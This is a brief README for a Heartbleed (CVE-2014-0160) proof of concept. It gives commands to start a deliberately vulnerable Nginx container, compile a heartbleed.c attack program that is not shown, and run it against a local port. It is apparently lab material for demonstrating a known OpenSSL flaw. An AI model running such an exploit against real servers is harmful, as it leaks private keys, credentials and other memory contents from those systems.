# heartbleed
CVE-2014-0160 OpenSSL Heartbleed Proof of Concept

Download and execute the Docker container (Vulnerable Nginx server)
```
docker run -p 4443:443 -it --rm --name hb gescobero/heartbleed:1.0
```
Compile Heartbleed attack
```
gcc heartbleed.c -o heartbleed
```
Execute it with Nginx server as target
```
./heartbleed 127.0.0.1 4443
```
